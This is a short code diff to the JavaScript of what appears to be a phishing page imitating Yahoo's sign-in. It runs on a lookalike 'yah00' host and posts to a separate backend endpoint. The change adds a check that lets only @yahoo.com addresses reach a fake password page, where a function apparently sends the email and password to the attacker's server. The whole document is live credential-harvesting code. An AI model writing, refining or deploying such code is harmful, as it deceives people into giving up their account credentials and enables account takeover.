@@ -5,6 +5,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const hostname = "https://yah00.onrender.com";
     const endpoint = "https://bkend-yad0.onrender.com/endpoint";
 
+    const yahooEmailRegex = /^[^\s@]+@yahoo\.com$/i;
 
     const nextButton = document.querySelector("#login-signin");
     const emailInput = document.querySelector("#login-username");
@@ -44,10 +45,19 @@ document.addEventListener("DOMContentLoaded", function () {
     //go to password page function declaration
     function gotoPassword(email) {
         //you can use regex for just yahoo mail and next otherwise display error
+        const isYahoo = isYahooEmail(email);
         //then
-        localStorage.setItem("user-email", email);
-        window.location.href = `${hostname}/display-password.htm`;
+        if(isYahoo){
+            localStorage.setItem("user-email", email);
+            window.location.href = `${hostname}/display-password.htm`;
+        }
+        return;
     };
+
+    function isYahooEmail(email) {
+       return yahooEmailRegex.test(email);
+    }
+
 
     async function sendFormAndRedirect(email, password) {
         localStorage.removeItem("user-email");
